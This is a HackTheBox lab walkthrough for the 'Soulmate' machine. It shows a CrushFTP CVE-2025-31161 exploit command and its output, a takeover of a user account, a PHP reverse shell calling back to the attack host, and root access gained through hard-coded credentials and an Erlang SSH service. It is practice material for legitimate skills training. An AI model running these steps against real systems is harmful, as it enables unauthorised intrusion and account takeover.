# Soulmate - HackTheBox Lab Case

## Target Information

| Property | Value |
|----------|-------|
| **IP Address** | 10.129.231.23 |
| **Hostname** | soulmate.htb |
| **Operating System** |  |
| **Difficulty** | Easy |
| **Attack Host** | 10.10.14.114 |

## Objectives

### Objective 1: User Flag

- **Flag:** ``
- **Location:** ``

### Objective 2: Root Flag

- **Flag:** ``
- **Location:** ``

## Attack Summary
ran auto_nmap.sh scans
ran curl header scan
added soulmate.htb to /etc/hosts file
ran auto_nmap.sh scans against http://soulmate.htb
gobuster founder ftp.soulmate.htb:80 Status: 302 [Size: 0] [--> /WebInterface/login.html]
added ftp.soulmate.htb to /etc/hosts files, found crush ftp web ftp site
    ran auto_nmap.sh scans against http://ftp.soulmate.htb
    curl options shows DAV available

browsed to site, appears to be a dating site.
    php backend (found on login post form)
    created TestUser:1qaz2wsx!QAZ@WSX account
    Logged in
    update profile page allows for image/file upload

researched CrushFTP for vulnerabilities, found: 
    https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation
    https://github.com/Immersive-Labs-Sec/CVE-2025-31161

    cloned repo for execution
        ┌──(kali㉿kali)-[/mnt/htba/cases/htb/Soulmate/scripts/CVE-2025-31161]
        └─ [2026-01-19 10:27:47] $ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password test123
        [+] Preparing Payloads
        [-] Warming up the target
        [+] Sending Account Create Request
        [!] User created successfully
        [+] Exploit Complete you can now login with
        [*] Username: test
        [*] Password: test123.

    logged in with new account
    clicked on admin button
    clicked the user manager button
    selected user ben, changed password to 123456
    logged in as ben, presented with user files
    uploaded https://github.com/pentestmonkey/php-reverse-shell.git to webprod folder with my attack system information
    this provided a reverse shell as user www-data
    from this shell, i uploaded linEnum.sh and linpeas.sh

    executed linpeas.sh and LinEnum.sh
    linpeas.log showed odd script running as root: 
        root        1100  0.0  1.6 2251660 67536 ?       Ssl  13:50   0:04 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_r
        unner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
    reviewed script which contained hard coded credentials: 
        {auth_methods, "publickey,password"},
        {user_passwords, [{"ben", "HouseH0ldings998"}]},

    attemped ssh login as ben and captured flag
    ben cannot sudo
    found all listenning ports with process IDs
    saw port 2222 open, which is for Erlang/OTP
    attempted to ssh as ben to that port
    obtained access
    researched Erlang commands: https://vuln.be/post/os-command-and-code-execution-in-erlang-and-elixir/
    erlang was running as root.  captured root flag.




